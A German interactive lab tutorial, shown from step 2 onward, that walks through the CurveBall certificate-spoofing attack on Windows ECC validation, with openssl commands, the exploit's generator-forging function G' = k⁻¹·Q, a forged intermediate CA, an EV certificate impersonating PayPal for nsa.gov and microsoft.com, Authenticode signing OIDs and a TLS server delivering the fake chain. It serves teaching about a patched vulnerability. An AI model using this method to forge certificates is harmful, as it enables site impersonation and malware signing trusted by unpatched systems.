Das Zielzertifikat

Das Feld ASN1 OID: prime256v1 ist eine benannte Kurve — Windows kennt die Parameter aus einer eingebauten Tabelle. Bei expliziten Parametern stünde stattdessen ein ganzer Block mit p, a, b, G, n, h im Zertifikat.

Inspiziere das echte Zwischenzertifikat der COMODO ECC EV CA. Achte auf den öffentlichen Punkt pub (das ist Q), die Seriennummer und das Feld ASN1 OID: prime256v1. CA:TRUE zeigt, dass dieses Zertifikat weitere Zertifikate ausstellen darf.

openssl x509 -in comodo-intermediate.crt -text -noout
Public Key Algorithm: id-ecPublicKey ASN1 OID: prime256v1 pub: 04:3b:72:... X509v3 Basic Constraints: critical CA:TRUE

Wie ist die Kurve in diesem Zertifikat angegeben?
Schritt 2 von 8

Die Idee

Lies den Code Zeile für Zeile: inverse_mod liefert k⁻¹, dann wird der Punkt Q aus den Koordinaten zusammengesetzt, und schließlich wird Q mit k⁻¹ multipliziert. Genau die Reihenfolge in der Formel.

Kein Befehl — nur Verstehen. Ordne jede Code-Zeile aus get_exploit_generator() einem Bestandteil der Formel G' = k⁻¹ · Q zu.

Code (badecparams.py)

def get_exploit_generator(k, Qx, Qy, curve): k_inverse = inverse_mod(k, curve.order) Q = Point(curve.curve, Qx, Qy, curve.order) G = Q * k_inverse return (G.x(), G.y())

Formel

G' = k⁻¹ · Q

Weil k · G' = k · k⁻¹ · Q = Q, ist k ein gültiger privater Schlüssel relativ zum neuen Generator G' — ohne den privaten Schlüssel der CA zu kennen.

Aufgabe · Zuordnung
Ordne jede Code-Zeile ihrem Formel-Anteil zu.
k_inverse = inverse_mod(k, curve.order)
Q = Point(curve.curve, Qx, Qy, curve.order)
G = Q * k_inverse
return (G.x(), G.y())
Schritt 3 von 8

Selbst nachrechnen

Erinnerung aus dem Endlichen-Körper-Rechnen: das Inverse einer Zahl mod n ist genau die Zahl, mit der multipliziert das neutrale Element der Multiplikation entsteht. In (ℤ/nℤ)* ist das neutrale Element … ganz einfach.

Das Demo-Skript liest Q aus dem Zertifikat, wählt ein k zufällig oder per Argument, berechnet G' = k⁻¹ · Q und verifiziert die Beziehung mit konkreten Zahlen.

🐍
curveball_demo.py
Berechnet und verifiziert G' = k⁻¹ · Q an konkreten Zahlen
↓ Download
python3 curveball_demo.py comodo-intermediate.crt 0
✓ gültig mit G' ← Angriff würde funktionieren ✗ ungültig mit G ← gepatchter Verifier würde ablehnen

Mit dem manipulierten Generator G' ist die Signatur mathematisch korrekt; mit dem echten Generator G schlägt sie fehl — genau das ist der Effekt des Patches.

Schritt 4 von 8

Der Angriff

Ohne k kannst du G' nicht berechnen. Ohne die Original-Kette kennst du Q nicht. Und ohne G' lässt sich das gefälschte Zertifikat nicht signieren. Am Ende brauchst du die Endzertifikate für den TLS-Handshake.

Das Angriffsskript führt sechs Phasen aus. Die Reihenfolge ist zwingend — jeder Schritt braucht das Ergebnis des vorherigen.

🔑
badecparams.py

↓ Download
./badecparams.py

Die gefälschte CA

Ein Angreifer, der den privaten Schlüssel der CA kennt, würde weder Q noch die Kurvenparameter anfassen. Und ein Angriff auf die Seriennummer wäre irrelevant — der Vergleich passiert über Q. Was muss anders sein, damit Windows den fremden Generator nutzt?

Inspiziere das gefälschte Zwischenzertifikat und lege die Ausgabe direkt neben die aus Schritt 1. Beide Zertifikate haben denselben öffentlichen Punkt Q und dieselbe Seriennummer — aber der Parameterblock ist unterschiedlich.

openssl x509 -in intermediateCA.crt -text -noout

Schritt 6 von 8

Codesignatur

Die OID-Präfixe verraten den Kontext: 1.3.6.1.4.1.311.* ist ein reservierter Microsoft-Zweig. 2.5.29.* wären generische X.509-Erweiterungen. Welcher Zweig gehört zu Authenticode?

Das Authenticode-Paket enthält Microsoft-spezifische OIDs für Code-Signing. Auf einem ungepatchten System ließe sich damit eine ausführbare Datei signieren, die Windows als vertrauenswürdig einstuft.

openssl pkcs7 -inform DER -in authenticode.spc -print_certs -noout

Sichtbare OIDs in der Ausgabe:

1.3.6.1.4.1.311.2.1.21 # SPC_INDIVIDUAL_SP_KEY_PURPOSE_OBJID 1.3.6.1.4.1.311.2.1.22 # SPC_COMMERCIAL_SP_KEY_PURPOSE_OBJID

Das EV-Zertifikat

Der grüne EV-Balken erschien vor Chrome/Edge 77, wenn zwei Dinge zutrafen: das Endzertifikat trägt eine bekannte EV-Policy-OID und die Kette endet bei einer als EV-fähig gelisteten CA. Der Subject-Name (hier absichtlich „PayPal, Inc.") wird dann im UI groß angezeigt.

localhost.crt ist ein selbst signiertes TLS-Endzertifikat mit Extended-Validation-Kennung. Es ist auf nsa.gov und microsoft.com ausgestellt und trägt bewusst den Subject-Namen „PayPal, Inc." — signiert von der gefälschten CA.

openssl x509 -in localhost.crt -text -noout
Subject: ... O=PayPal, Inc. ... X509v3 Subject Alternative Name: DNS:localhost, DNS:nsa.gov, DNS:www.nsa.gov, DNS:microsoft.com, DNS:www.microsoft.com Certificate Policies: 1.3.6.1.4.1.6449.1.2.1.5.1 # COMODO EV-Policy-OID

Schritt 8 von 8

Über die Leitung

Zwei Faktoren müssen zusammenkommen: der Verifier muss den Generator aus dem Zertifikat übernehmen und das Zertifikat muss denselben öffentlichen Punkt tragen wie eine bereits vertraute CA. Fehlt eins von beiden, greift der Trick nicht.

Starte den TLS-Server und verbinde dich mit OpenSSL. Der Handshake liefert die vollständige gefälschte Kette — das Angriffsmaterial geht jetzt über das Netz.

🌐
httpd.py
TLS-Miniserver – liefert die gefälschte Zertifikatskette per Handshake aus
↓ Download
sudo ./httpd.py localhost.key

In einem zweiten Terminal:

openssl s_client -connect localhost:8443 -showcerts

In der Ausgabe sind drei Zertifikate sichtbar: Endzertifikat → gefälschte CA → Original-CA. Ein ungepatchter Windows-Client würde diese Kette akzeptieren.
